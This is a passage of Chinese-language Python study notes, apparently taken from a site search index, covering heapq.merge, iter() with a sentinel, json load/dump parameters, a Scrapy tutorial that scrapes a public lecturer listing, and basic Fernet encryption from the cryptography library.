print(c)\n...\n1\n2\n4\n5\n6\n7\n10\n11 heapq.merge 可迭代特性意味着它不会立马读取所有序列。这就意味着你可以在 非常长的序列中使用它，而不会有太大的开销。\n比如，下面是一个例子来演示如何合并 两个排序文件: with open('sorted_file_1', 'rt') as file1, \\\n    open('sorted_file_2', 'rt') as file2, \\\n    open('merged_file', 'wt') as outf:\n\n  for line in heapq.merge(file1, file2):\n    outf.write(line) 有一点要强调的是 heapq.merge() 需要所有输入序列必须是排过序的。\n特别的， 它并不会预先读取所有数据到堆栈中或者预先排序，也不会对输入做任何的排序检测。\n它仅仅是检查所有序列的开始部分并返回最小的那个，这个过程一直会持续直到所有 输入序列中的元素都被遍历完。 迭代器代替 while 无限循环 你在代码中使用 while 循环来迭代处理数据，因为它需要调用某个函数或者和一 般迭代模式不同的测试条件。\n能不能用迭代器来重写这个循环呢? 一个常见的 IO 操作程序可能会想下面这样: CHUNKSIZE = 8192\ndef reader(s):\n  while True:\n    data = s.recv(CHUNKSIZE)\n    if data == b'':\n      break\n    process_data(data) 这种代码通常可以使用 iter() 来代替，如下所示: def reader2(s):\n  for chunk in iter(lambda: s.recv(CHUNKSIZE), b''):\n    pass\n    # process_data(data) iter 函数一个鲜为人知的特性是它接受一个可选的 callable 对象和一个标记 (结 尾) 值作为输入参数。\n当以这种方式使用的时候，它会创建一个迭代器，这个迭代器会 不断调用 callable 对象直到返回值和标记值相等为止。 迭代器与生成器区别 迭代器提供一种顺序访问集合或序列元素的方式，使用 next() 方法获取每个元素。 生成器是一种特殊类型的函数，通过使用 yield 关键字生成序列值，\n每次调用生成器函数返回一个迭代器对象，通过迭代器对象可以按需获取生成的序列值。","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Iterator,-generator.html","loc":"/yq-docs-rear-end-python-cookbook-Iterator,-generator.html"},{"title":"json","text":"四大方法: json.load             将文件中的json的格式转化成python对象提取出来, 操作的是文件流 json.loads    将Json字符串解码成python对象, 操作的是字符串 json.dump     将python中的对象转化成json储存到文件中, 需要传入打开的文件流 json.dumps    将python对象编码成Json字符串 dump()及其参数 json.dump(data, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None) sort_keys=True 是告诉编码器按照字典排序(a到z)输出。如果是字典类型的python对象，就把关键字按照字典排序 indent 参数根据数据格式缩进显示，读起来更加清晰。 separators 是分隔符的意思，参数意思分别为不同dict项之间的分隔符和dict项内key和value之间的分隔符 skipkeys 默认值是False，如果dict的keys内的数据不是python的基本类型(str,unicode,int,long,float,bool,None)，\n设置为False时，就会报TypeError的错误。此时设置成True，则会跳过这类key ensure_ascii=True 默认输出ASCLL码字符，如果把这个改成False, 就可以正常 输出中文 到文件 check_circular 如果check_circular为false，则跳过对容器类型的循环引用检查，循环引用将导致溢出错误(或更糟的情况) allow_nan 如果allow_nan为假，则ValueError将序列化超出范围的浮点值(nan、inf、-inf)，\n严格遵守JSON规范，而不是使用JavaScript等价值(nan、Infinity、-Infinity) default default(obj)是一个函数，它应该返回一个可序列化的obj版本或引发类型错误。默认值只会引发类型错误 load()的参数 我们先看下json.loads方法的签名: def loads(s, encoding=None, cls=None, object_hook=None, parse_float=None,\n        parse_int=None, parse_constant=None, object_pairs_hook=None, **kw):\n    \"\"\"Deserialize ``s`` (a ``str`` or ``unicode`` instance containing a JSON    # 把一个字符串反序列化为Python对象，这个字符串可以是str类型的，也可以是unicode类型的\n    document) to a Python object.\n\n\n    If ``s`` is a ``str`` instance and is encoded with an ASCII based encoding    # 如果参数s是以ASCII编码的字符串，那么需要手动通过参数encoding指定编码方式，\n    other than utf-8 (e.g. latin-1) then an appropriate ``encoding`` name         # 不是以ASCII编码的字符串，是不被允许的，你必须把它转为unicode\n    must be specified. Encodings that are not ASCII based (such as UCS-2)\n    are not allowed and should be decoded to ``unicode`` first.\n\n\n    ``object_hook`` is an optional function that will be called with the        # object_hook参数是可选的，它会将（loads的)返回结果字典替换为你所指定的类型\n    result of any object literal decode (a ``dict``). The return value of        # 这个功能可以用来实现自定义解码器，如JSON-RPC\n    ``object_hook`` will be used instead of the ``dict``. This feature\n    can be used to implement custom decoders (e.g. JSON-RPC class hinting).\n\n\n    ``object_pairs_hook`` is an optional function that will be called with the    # object_pairs_hook参数是可选的，它会将结果以key-value列表的形式返回\n    result of any object literal decoded with an ordered list of pairs.  The      # 形式如：[(k1, v1), (k2, v2), (k3, v3)]\n    return value of ``object_pairs_hook`` will be used instead of the ``dict``.   # 如果object_hook和object_pairs_hook同时指定的话优先返回object_pairs_hook\n    This feature can be used to implement custom decoders that rely on the\n    order that the key and value pairs are decoded (for example,\n    collections.OrderedDict will remember the order of insertion). If\n    ``object_hook`` is also defined, the ``object_pairs_hook`` takes priority.\n\n\n    ``parse_float``, if specified, will be called with the string                 # parse_float参数是可选的，它如果被指定的话，在解码json字符串的时候，\n    of every JSON float to be decoded. By default this is equivalent to           # 符合float类型的字符串将被转为你所指定的，比如说你可以指定为decimal.Decimal\n    float(num_str). This can be used to use another datatype or parser\n    for JSON floats (e.g. decimal.Decimal).\n\n\n    ``parse_int``, if specified, will be called with the string                   # parse_int参数是可选的，它如果被指定的话，在解码json字符串的时候，\n    of every JSON int to be decoded. By default this is equivalent to             # 符合int类型的字符串将被转为你所指定的，比如说你可以指定为float\n    int(num_str). This can be used to use another datatype or parser\n    for JSON integers (e.g. float).\n\n\n    ``parse_constant``, if specified, will be called with one of the              # parse_constant参数是可选的，它如果被指定的话，在解码json字符串的时候，\n    following strings: -Infinity, Infinity, NaN.                                  # 如果出现以以下字符串: -Infinity, Infinity, NaN 那么指定的parse_constant方法将会被调用到\n    This can be used to raise an exception if invalid JSON numbers\n    are encountered.\n\n\n    To use a custom ``JSONDecoder`` subclass, specify it with the ``cls``         # 你也可以用cls参数通过实现一个JSONDecoder的子类，来代替JSONDecoder,通过这个功能你可以自定义上面的那些parse_xxx参数,这里就不举例了\n    kwarg; otherwise ``JSONDecoder`` is used.\n\n\n    \"\"\" 以下参数说明是根据官方文档翻译的 s参数 把一个字符串反序列化为Python对象，这个字符串可以是str类型的，也可以是unicode类型的，\n如果参数s是以ASCII编码的字符串，那么需要手动通过参数encoding指定编码方式，\n不是以ASCII编码的字符串，是不被允许的，你必须把它转为unicode 对于loads方法来说，s是一个字符串，而对于load方法来说，是一个数据流文件 object_hook参数 object_hook参数是可选的，它会将（loads的)返回结果字典替换为你所指定的类型,这个功能可以用来实现自定义解码器，如JSON-RPC 这里先定义一个Person对象: class Person:\n    def __init__(self, name, age, gender):\n        self.name = name\n        self.age = age\n        self.gender = gender\n\n    def toJSON(self):\n        return {\n            \"name\": self.name,\n            \"age\": self.age,\n            \"gender\": self.gender\n        }\n\n    @staticmethod\n    def parseJSON(dct):\n        if isinstance(dct, dict):\n            p = Person(dct[\"name\"], int(dct['age']), dct['gender'])\n            return p\n        return dct OK，试下object_hook参数吧: s = '{\"name\": \"马云\", \"age\": 54, \"gender\": \"man\"}'\n# 测试json.loads方法的object_hook参数\np = json.loads(s, object_hook=Person.parseJSON)\nprint(\"json.loads 是否将字符串转为字典了: --> \" + str(isinstance(p, dict)))\nprint(\"json.loads 是否将字符串转为Person对象了: --> \" + str(isinstance(p, Person))) object_pairs_hook参数 object_pairs_hook参数是可选的，它会将结果以key-value有序列表的形式返回,\n形式如: [(k1, v1), (k2, v2), (k3, v3)] ,\n如果object_hook和object_pairs_hook同时指定的话优先返回object_pairs_hook: s = '{\"name\": \"马云\", \"age\": 54, \"gender\": \"man\"}'\n# 测试json.loads方法的object_pairs_hook参数\nprint(\"-\" * 30 + \"> test object_pairs_hook <\" + \"-\" * 30)\np = json.loads(s, object_hook=Person.parseJSON, object_pairs_hook=collections.OrderedDict)\n# p = json.loads(s, object_hook=Person.parseJSON, object_pairs_hook=Person.parseJSON)\nprint(\"json.loads 测试同时指定object_hook和object_pairs_hook,最终调用哪个参数: --> \" + str(type(p)))\nprint(\"json.loads 指定object_pairs_hook结果将会返回一个有序列表 --> {}\".format(p)) parse_float参数 parse_float参数是可选的，它如果被指定的话，在解码json字符串的时候，\n符合float类型的字符串将被转为你所指定的，比如说你可以指定为decimal.Decimal 测试json.loads方法的parse_float参数: print(\"-\" * 30 + \"> test parse_float <\" + \"-\" * 30)\np = json.loads(\"123.456\", parse_float=decimal.Decimal)\nprint(\"json.loads 通过parse_float参数将原本应该转为float类型的字符串转为decimal类型: type(json.loads(\\\"123.456\\\", parse_float=decimal.Decimal)) --> \" + str(type(p)))\nprint(\"\") parse_int参数 parse_int参数是可选的，它如果被指定的话，在解码json字符串的时候，\n符合int类型的字符串将被转为你所指定的，比如说你可以指定为float 测试json.loads方法的parse_int参数: print(\"-\" * 30 + \"> test parse_int <\" + \"-\" * 30)\np = json.loads(\"123\", parse_int=float)\nprint(\"json.loads 通过parse_int参数将原本应该转为int类型的字符串转为float类型: type(json.loads(\\\"123\\\", parse_int=float)) --> \" + str(type(p))) parse_constant参数 parse_constant参数是可选的，它如果被指定的话，在解码json字符串的时候，\n如果出现以以下字符串:-Infinity，Infinity，NaN那么指定的parse_constant方法将会被调用到: def transform(s):\n    \"\"\"\n    此方法作为参数传给json.load(s)方法的parse_转译NAN, -Infinity,Infinity\n    :param s:\n    :return:\n    \"\"\"\n    # NaN --> not a number\n    if \"NaN\" == s:\n        return \"Not a Number\"\n    # 将负无穷大转为一个非常小的数\n    elif \"-Infinity\" == s:\n        return -999999\n    # 将正无穷大转为一个非常大的数\n    elif \"Infinity\" == s:\n        return 999999\n    else:\n        return s\n\n# 测试json.loads方法的parse_constant参数\nprint(\"-\" * 30 + \"> test parse_constant <\" + \"-\" * 30)\nprint(\"json.loads Infinity: --> \" + str(json.loads('Infinity')))\nprint(\"json.loads parse_constant convert Infinity: --> \" + str(json.loads('Infinity', parse_constant=transform_constant)))\n\nprint(\"json.loads -Infinity: --> \" + str(json.loads('-Infinity')))\nprint(\"json.loads parse_constant convert -Infinity: --> \" + str(json.loads('-Infinity', parse_constant=transform_constant)))\n\nprint(\"json.loads NaN: --> \" + str(json.loads('NaN')))\nprint(\"json.loads parse_constant convert NaN : --> \" + str(json.loads('NaN', parse_constant=transform_constant)))\nprint(\"\") cls参数 通过官方文档的注释我们可以知道json.load(s)方法具体的实现是通过JSONCoder类实现的，\n而cls参数是用于自定义一个JSONCoder的子类，用于替换JSONCoder类，,通过这个功能你可以自定义上面的那些parse_xxx参数，这里就不举例了 原文链接: https://blog.csdn.net/daerzei/article/details/100598901 dump和dumps的区别 json.dumps() 是把python对象转换成json对象的一个过程，生成的是字符串。 json.dump() 是把python对象转换成json对象生成一个fp的文件流，和文件相关。 loads和load 下面主要分析讲解一下json的loads和load方法。\n这两个方法中都是把其他类型的对象转为Python对象，这里先说明一下Python对象，\nPython对象包括：\n所有Python基本数据类型，列表，元组，字典，自己定义的类，等等等等，当然不包括Python的字符串类型，把字符串或者文件鎏中的字符串转为字符串会报错的 先来一个例子，除了要转换的对象，其他什么参数都不传: s = '{\"name\": \"wade\", \"age\": 54, \"gender\": \"man\"}'\n# json.loads读取字符串并转为Python对象\nprint(\"json.loads将字符串转为Python对象: type(json.loads(s))\n      = {}\".format(type(json.loads(s))))\nprint(\"json.loads将字符串转为Python对象: json.loads(s)\n      = {}\".format(json.loads(s)))\n\n# json.load读取文件并将文件内容转为Python对象\n# 数据文件要s.json的内容 --> {\"name\": \"wade\", \"age\": 54, \"gender\": \"man\"}\nwith open('s.json', 'r') as f:\n    s1 = json.load(f)\n    print(\"json.load将文件内容转为Python对象: type(json.load(f)) = {}\".format(type(s1)))\n    print(\"json.load将文件内容转为Python对象: json.load(f) = {}\".format(s1)) 日常工作中最常见的就是把字符串通过json.loads转为字典，\n其实json的loads方法不仅可以把字符串转为字典，还可以转为任何Python对象。\n比如说，转成python基本数据类型: print('json.loads 将整数类型的字符串转为int类型: type(json.loads(\"123456\"))) --> {}'.format(type(json.loads(\"123456\"))))\nprint('json.loads 将浮点类型的字符串转为float类型: type(json.loads(\"123.456\")) --> {}'.format(type(json.loads(\"123.456\"))))\nprint('json.loads 将boolean类型的字符串转为bool类型: type(json.loads(\"true\")) --> {}'.format((type(json.loads(\"true\")))))\nprint('json.loads 将列表类型的字符串转为列表: type(json.loads(\\'[\"a\", \"b\", \"c\"]\\')) --> {}'.format(type(json.loads('[\"a\", \"b\", \"c\"]'))))\nprint('json.loads 将字典类型的字符串转为字典: type(json.loads(\\'{\"a\": 1, \"b\": 1.2, \"c\": true, \"d\": \"ddd\"}\\')) --> %s' % str(type(json.loads('{\"a\": 1, \"b\": 1.2, \"c\": true, \"d\": \"ddd\"}')))) json模块会根据你的字符串自动转为最符合的数据类型，\n但是需要注意的是不能转为字符串，否则会报json.decoder.JSONDecodeError错误: json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-json.html","loc":"/yq-docs-rear-end-python-python-standard-library-json.html"},{"title":"Scrapy shell","text":"交互式终端工具 参考: https://docs.scrapy.org/en/latest/topics/shell.html#topics-shell 如果有安装 IPython , 就会使用 IPython , 否则使用默认 Python 的交互式终端 启动: scrapy shell <url> url 想爬取的 url 地址. 也支持本地的 html 文件: # UNIX-style\nscrapy shell ./path/to/file.html\nscrapy shell ../other/path/to/file.html\nscrapy shell /absolute/path/to/file.html\n\n# File URI\nscrapy shell file:///absolute/path/to/file.html 支持的指令 view 从浏览器打开: >>> view(response)\nTrue","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Scrapy-shell.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Scrapy-shell.html"},{"title":"使用","text":"制作 Scrapy 爬虫 一共需要4步： 新建项目 (scrapy startproject xxx)：新建一个新的爬虫项目 明确目标 （编写items.py）：明确你想要抓取的目标 制作爬虫 （spiders/xxspider.py）：制作爬虫开始爬取网页 存储内容 （pipelines.py）：设计管道存储爬取内容 新建项目 创建一个工作目录workdir并进入: mkdir workdir; cd workdir 创建虚拟环境(省略)并安装依赖: pip install Scrapy 创建项目: scrapy startproject mySpider 输出: (.venv) yanque@mbp16 StudyScrapy % scrapy startproject mySpider\nNew Scrapy project 'mySpider', using template directory '/Users/yanque/Project/Code/Pycharm/StudyScrapy/.venv/lib/python3.11/site-packages/scrapy/templates/project', created in:\n    /Users/yanque/Project/Code/Pycharm/StudyScrapy/mySpider          scons                  sconsign               screen                 script                 scutil\n\nYou can start your first spider with:\n    cd mySpider\n    scrapy genspider example example.com 查看目录结构: (.venv) yanque@mbp16 StudyScrapy % tree mySpider\nmySpider\n├── mySpider\n│   ├── __init__.py\n│   ├── items.py\n│   ├── middlewares.py\n│   ├── pipelines.py\n│   ├── settings.py\n│   └── spiders\n│       └── __init__.py\n└── scrapy.cfg\n\n2 directories, 7 files 这些文件分别是: scrapy.cfg: 项目的配置文件。 mySpider/: 项目的Python模块，将会从这里引用代码。 mySpider/items.py: 项目的目标文件。 middlewares.py: 中间件文件 mySpider/pipelines.py: 项目的管道文件。 mySpider/settings.py: 项目的设置文件。 mySpider/spiders/: 存储爬虫代码目录。 明确目标(mySpider/items.py) 我们打算抓取 黑马 网站里的所有讲师的姓名、职称和个人信息。 打开 mySpider 目录下的 items.py。 Item 定义结构化数据字段，用来保存爬取到的数据，有点像 Python 中的 dict，但是提供了一些额外的保护减少错误。 可以通过创建一个 scrapy.Item 类， 并且定义类型为 scrapy.Field 的类属性来定义一个 Item（可以理解成类似于 ORM 的映射关系）。 接下来，创建一个 ItcastItem 类，和构建 item 模型（model）: import scrapy\n\nclass ItcastItem(scrapy.Item):\n  head = scrapy.Field()\n  name = scrapy.Field()\n  level = scrapy.Field()\n  desc = scrapy.Field() 制作爬虫(spiders/itcastSpider.py) 爬数据 在 mySpider/spiders 目录下输入命令: scrapy genspider itcast \"itcast.cn\" 将在 mySpider/spiders 目录下创建一个名为 itcast 的爬虫，并指定爬取域的范围.\nmySpider/spiders 目录里的 itcast.py，默认代码: import scrapy\n\nclass ItcastSpider(scrapy.Spider):\n    name = \"itcast\"\n    allowed_domains = [\"itcast.cn\"]\n    start_urls = (\n        'http://www.itcast.cn/',\n    )\n\n    def parse(self, response):\n        pass 注解 可以由我们自行创建itcast.py并编写上面的代码，只不过使用命令可以免去编写固定代码的麻烦 要建立一个Spider， 你必须用scrapy.Spider类创建一个子类，并确定了三个强制的属性 和 一个方法。 name = \"\" 这个爬虫的识别名称，必须是唯一的，在不同的爬虫必须定义不同的名字。 allow_domains = [] 是搜索的域名范围，也就是爬虫的约束区域，规定爬虫只爬取这个域名下的网页，不存在的URL会被忽略。 新版本貌似已经废弃 start_urls = () 爬取的URL元祖/列表。爬虫从这里开始抓取数据，所以，第一次下载的数据将会从这些urls开始。其他子URL将会从这些起始URL中继承性生成。 或者不定义 start_urls, 直接重写 start_requests def start_requests(self):\n      urls = [\n          \"https://quotes.toscrape.com/page/1/\",\n          \"https://quotes.toscrape.com/page/2/\",\n      ]\n      for url in urls:\n          yield scrapy.Request(url=url, callback=self.parse) 注意 start_requests 返回结果需要是一个生成器 parse(self, response) 解析的方法，每个初始URL完成下载后将被调用，调用的时候传入从每一个URL传回的Response对象来作为唯一参数，\n主要作用如下： 负责解析返回的网页数据(response.body)，提取结构化数据(生成item) 生成需要下一页的URL请求。 将start_urls的值修改为需要爬取的第一个url: start_urls = (\"http://www.itcast.cn/channel/teacher.shtml\",) 修改parse()方法: from scrapy.http import Request, Response\n\ndef parse(self, response: Response):\n  filename = \"teacher.html\"\n  with open(filename, 'w') as f:\n      f.write(response.body.decode('utf-8')) 然后运行一下这个爬虫看看，在 mySpider 目录下执行( 一定要确定正确的根目录 ): cd mySpider; scrapy crawl itcast 可以看到 mySpider 下生成了爬取的 teacher.html 发生了什么? 不管是否重新定义 start_requests ,\nstart_requests 的返回结果都是 scrapy.Request 对象的生成器 对于每一个生成器的 url, 都会调用 parse 方法, 处理拿到的数据 另外, start_requests 返回的 scrapy.Request 默认回调就是 parse shell工具 最开始可以使用 Scrapy shell 工具: scrapy shell 'http://www.itcast.cn/channel/teacher.shtml' 来启动一个交互式终端 可以选择使用了指定 CSS 标签, 示例寻找 <title> 元素: >>> response.css(\"title\")\n[<Selector query='descendant-or-self::title' data='<title>师资力量|讲师介绍_黑马程序员</title>'>]\n>>> 输出结果是一个 SelectorList 对象, 代表所有查询到的元素的列表 查看所有: >>> response.css(\"title\").getall()\n['<title>师资力量|讲师介绍_黑马程序员</title>'] 只需要文本: >>> response.css(\"title::text\").getall()\n['师资力量|讲师介绍_黑马程序员'] 只获取第一个元素的文本: >>> response.css(\"title::text\").get()\n'师资力量|讲师介绍_黑马程序员' 等价于: >>> response.css(\"title::text\")[0].get()\n'师资力量|讲师介绍_黑马程序员' 注解 使用索引的方式, 如果没有就报错索引越界, 所以还是直接用 get 获取第一个好点 还支持使用 re 进行正则: >>> response.css(\"title::text\").re(r\".*\")\n['师资力量|讲师介绍_黑马程序员', '']\n>>>\n>>> response.css(\"title::text\").re(r\"\\w*\")\n['师资力量', '', '讲师介绍_黑马程序员', '']\n>>>\n>>> response.css(\"title::text\").re(r\"(\\w*)_(\\w*)\")\n['讲师介绍', '黑马程序员'] 还可以从浏览器打开缓存的 HTML 页面: >>> view(response)\nTrue 原始数据解析 我们可以研究下之前拿到的 teacher.html ,\n可以看到, 老师信息都在一个 div 里面: 结构大概如下: <div class=\"tea_con\">\n  <div class=\"tea_txt\"> 第一部分老师信息的 li 列表 </div>\n  <div class=\"tea_txt\"> 第二部分老师信息的 li 列表 </div>\n  <div class=\"tea_txt\"> 第三部分老师信息的 li 列表 </div>\n  ...\n</div> 我们现在使用 CSS 选择器获取最外层: >>> response.css(\"div.tea_con\")\n[<Selector query=\"descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_con ')]\" data='<div class=\"tea_con\">\\n\\t\\t<div class=\"t...'>]\n>>> 定位下一层(输出太多就不全贴): >>> response.css(\"div.tea_con div.tea_txt\")\n[<Selector query=\"descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_con ')]... 这个时候获取的结果列表是所有的: <div class=\"tea_txt\">...\n<div class=\"tea_txt\">...\n<div class=\"tea_txt\">...\n... 继续, 如何获取每一部分的信息, 先观察html: <ul>\n                              <li>\n                                      <img src='images/teacher/javaee/20210126133739杜老师_讲师.jpg'>\n                                      <div class=\"li_txt\">\n                                              <h3>杜老师</h3>\n                                              <h4>高级讲师</h4>\n                                              <p>15年软件开发与教学经验，熟练掌握MySQL、Redis、SSM框架、Dubbo、ZooKeeper、SpringBoot、SpringCloud等技术,主持与参与过市级财务系统，企业管理等系统开发。熟悉分布式技术，了解微服务架构，具备多个行业项目产品开发与管理经验，对培训有深刻的理解和把握。</p>\n                                      </div>\n                              </li>\n                              <li>\n                                      <img src='images/teacher/javaee/2020080614171120200701111719姜涛.jpg'>\n                                      <div class=\"li_txt\">\n                                              <h3>姜老师</h3>\n                                              <h4>高级讲师</h4>\n                                              <p>擅长Java EE企业级应用，十余年项目管理经验，曾担任开发工程师，架构师等重要角色。主导多个大型项目的架构设计、管理等工作。在互联网项目领域具备丰富的经验，精通微服务架构，擅长解决高并发，亿级数据量等架构设计，拥有广泛的技术面与实践经验。</p>\n                                      </div>\n                              </li>\n\n      ...\n</ul> 到这里其实就不用考虑外部的循环了, 可以直接定位到每一个li标签: response.css(\"div.tea_con div.tea_txt ul li\") 先只考虑第一个(因为li内部结构一致, 后面的迭代就行): >>> response.css(\"div.tea_con div.tea_txt ul li\")[0]\n<Selector query=\"descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_con ')]/descendant-or-self::*/div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_txt ')]/descendant-or-self::*/ul/descendant-or-self::*/li\" data='<li>\\n\\t\\t\\t\\t\\t<img src=\"images/teacher/ja...'>\n>>>\n>>> t1 = response.css(\"div.tea_con div.tea_txt ul li\")[0]\n>>> 获取老师照片: >>> t1.css(\"img::attr(src)\").get()\n'images/teacher/javaee/20210126133739杜老师_讲师.jpg' 获取老师名字: >>> t1.css(\"h3::text\").get()\n'杜老师' 级别: >>> t1.css(\"h4::text\").get()\n'高级讲师' 介绍: >>> t1.css(\"p::text\").get()\n'15年软件开发与教学经验，熟练掌握MySQL、Redis、SSM框架、Dubbo、ZooKeeper、SpringBoot、SpringCloud等技术,主持与参与过市级财务系统，企业管理等系统开发。熟悉分布式技术，了解微服务架构，具备多个行业项目产品开发与管理经验，对培训有深刻的理解和把握。'\n>>> 那么对于所有的老师, 可以简单的循环处理: >>> data = []\n>>> from collections import namedtuple\n>>> Teacher = namedtuple(\"Teacher\", [\"image\", \"name\", \"level\", \"desc\"])\n>>> for t in response.css(\"div.tea_con div.tea_txt ul li\"):\n...     img = t.css(\"img::attr(src)\").get()\n...     name = t.css(\"h3::text\").get()\n...     level = t.css(\"h4::text\").get()\n...     desc = t.css(\"p::text\").get()\n...     data.append(Teacher(img, name, level, desc)) 就获取到了所有数据, 可以简单看看结果: >>> data[0]\nTeacher(image='images/teacher/javaee/20210126133739杜老师_讲师.jpg', name='杜老师', level='高级讲师', desc='15年软件开发与教学经验，熟练掌握MySQL、Redis、SSM框架、Dubbo、ZooKeeper、SpringBoot、SpringCloud等技务架构，具备多个行业项目产品开发与管理经验，对培训有深刻的理解和把握。')\n>>> data[1]\nTeacher(image='images/teacher/javaee/2020080614171120200701111719姜涛.jpg', name='姜老师', level='高级讲师', desc='擅长Java EE企业级应用，十余年项目管理经验，曾担任开发工程师，架构师等重要角色。主导多个大型项构设计，拥有广泛的技术面与实践经验。')\n>>> data.__len__()\n179 所以 parse 可以这么写: def parse(self, response: Response):\n  # filename = \"teacher.html\"\n  # with open(filename, 'w') as f:\n  #     f.write(response.body.decode('utf-8'))\n\n  from collections import namedtuple\n  Teacher = namedtuple(\"Teacher\", [\"image\", \"name\", \"level\", \"desc\"])\n  data: [Teacher] = []\n  for t in response.css(\"div.tea_con div.tea_txt ul li\"):\n      img = t.css(\"img::attr(src)\").get()\n      name = t.css(\"h3::text\").get()\n      level = t.css(\"h4::text\").get()\n      desc = t.css(\"p::text\").get()\n      data.append(Teacher(img, name, level, desc))\n\n  with open(\"teacher.json\", \"w\") as f:\n      json.dump({\"data\": data}, f, ensure_ascii=False, indent=4) 执行下看看结果: cd mySpider; scrapy crawl itcast teacher.json内容(部分): 解析数据转给框架 还是改 parse: def parse(self, response: Response):\n  for t in response.css(\"div.tea_con div.tea_txt ul li\"):\n      img = t.css(\"img::attr(src)\").get()\n      name = t.css(\"h3::text\").get()\n      level = t.css(\"h4::text\").get()\n      desc = t.css(\"p::text\").get()\n\n      yield {\n          \"head\": img,\n          \"name\": name,\n          \"level\": level,\n          \"desc\": desc,\n      } 这个时候再启动就可以看到数据打印在日志了, 太多我就不放了. 将框架获取到的数据导出到 t.json: scrapy crawl itcast -O t.json 效果: 还可使用 -o t.jsonl 仅新增, 详细参考 crawl <CmdCrawl> 如果需要或许的数据是链接比如 href (即动态的): <ul class=\"pager\">\n    <li class=\"next\">\n        <a href=\"/page/2/\">Next <span aria-hidden=\"true\">&rarr;</span></a>\n    </li>\n</ul> 可以在parse后增加后续的爬取: def parse(...):\n  ...\n\n  next_page = response.css(\"li.next a::attr(href)\").get()\n  if next_page is not None:\n      next_page = response.urljoin(next_page)\n      yield scrapy.Request(next_page, callback=self.parse) 注解 urljoin 提供了自动拼接到上一层, 从而转换为绝对路径的功能 或者也可以直接通过 response.follow 使用相对路径: for href in response.css(\"ul.pager a::attr(href)\"):\n  yield response.follow(href, callback=self.parse) 实际对于 a 标签, 提供了自动支持找href的功能: for a in response.css(\"ul.pager a\"):\n  yield response.follow(a, callback=self.parse) 甚至可以直接一次性多匹配: anchors = response.css(\"ul.pager a\")\n  yield from response.follow_all(anchors, callback=self.parse)\n\n# 简单点就是\nyield from response.follow_all(css=\"ul.pager a\", callback=self.parse) XPath支持 XPath 参考 index 除了 上面的使用 CSS选择器来做数据提取,\nScrapy的 选择器 也支持 XPath 对象: >>> response.xpath(\"//title\")\n[<Selector query='//title' data='<title>师资力量|讲师介绍_黑马程序员</title>'>] 返回的也是 SelectorList 对象: >>> response.xpath(\"//title\").get()\n'<title>师资力量|讲师介绍_黑马程序员</title>' 注解 举例, 如果有一个 div: <div class=\"quote\"></div> 如何正确的选择此节点: response.css(\"div.quote\") 举例, 还是上面的老师信息获取: >>> response.xpath(\"//div[@class='tea_con']\")\n[<Selector query=\"//div[@class='tea_con']\" data='<div class=\"tea_con\">\\n\\t\\t<div class=\"t...'>] 同样的, parse 文件 存储内容 （pipelines.py） 设计管道存储爬取内容 如果只是简单的获取某些数据, 那么上面的内容已经足够. 但若想处理更复杂的事情, 那么就需要使用到 pipelines 参考: Scrapy Tutorial","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-use.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-use.html"},{"title":"cryptography","text":"项目地址: https://github.com/pyca/cryptography/ 官网文档: https://cryptography.io/en/latest/ 翻译就是 密码学 密码学可研究下101: CRYPTO101 一个新的标准Python加密库 为什么建立一个新的Python密码库？ 现有的Python密码库，如M2Crypto, PyCrypto, or PyOpenSSL，存在一些问题： 缺少PyPy和Python 3支持 缺少维护 使用了差评的算法实现（例如旁路攻击side-channel attacks） 缺少高级（易于使用）的APIs 缺少AES-GCM和HKDF等算法 经不住测试 错误百出的APIs 特性 Cyptography密码库包括两个部分：cryptographic recipes and primitives.这是本密码库非常有意思的地方，很多现有的其他密码库并没有这个特点。cryptographic recipes，直接翻译为密码学菜谱。其实个人也一时找不出合适的词语来解释。cryptographic primitives，即为密码学原语，也就是基本的密码概念，如加密、签名、Hash等算法。但是直接使用密码学原语容易出错，在实际应用中无法保证安全性。基于这一点，该库对密码学原语进行了安全集成，形成了更高层次的\"密码学菜谱\"。这么说吧，密码学原语像是做菜的原材料，对于初学者来说，虽然手里都有，但是不懂得如何去制作；如果有了\"密码学菜谱\"，初学者直接按照说明，制作菜肴就可以了。 安装: pip install cryptography 用例 Cryptography密码库实现了一个集成的对称密码函数，称之为Fernet。它可以保证信息无法被篡改和破解。 加解密 加解密的例子: >>>from cryptography.fernet import Fernet\n\n>>>key = Fernet.generate_key()    # 产生加密所需的密钥key，它通过调用相关函数而产生随机数。\n\n>>>key\n\nOut[3]: 'x10qxCPeNGhddcP5fASy5XB1JedmwXJeAF1gS-zeuvw='\n\n>>>f = Fernet(key)    # 实例化Fernet\n\n>>>f\n\nOut[6]: <cryptography.fernet.Fernet at 0xb969668>\n\n>>>token = f.encrypt(b\"my deep dark secret\")     # 加密消息\n\n>>>token\n\nOut[8]: 'gAAAAABYnKtVmGpMe6rM39jzSYFTlBxjXBwbCix8nZ2DBzsFh6BVzwtrYx0qDyohXQ3xqj232_DJsdN8bR9sMUQbEcPenZD-MAWqR-YkOdg7prc9e0QnMA4='\n\n>>>f.decrypt(token)     # 加密消息\n\nOut[9]: 'my deep dark secret' 密钥轮换（Key rotation） 密钥轮换（Key rotation）的例子 MultiFernet的输入为多个key的列表，它总是以第一个密钥加密消息，而在解密时，依次使用每个密钥。 Key rotation机制使得替代旧的密钥变得容易。\n个人可以将新的密钥添加在key列表的第一个，开始加密新的消息，而在解密以前的密文后，如果旧的密钥不再需要则丢弃: >>>from cryptography.fernet import Fernet, MultiFernet\n\n>>>key1 = Fernet(Fernet.generate_key())\n\n>>>key2 = Fernet(Fernet.generate_key())\n\n>>>f = MultiFernet([key1, key2])\n\n>>>token = f.encrypt(b\"Secret message!\")\n\n>>>token\nOut[6]: 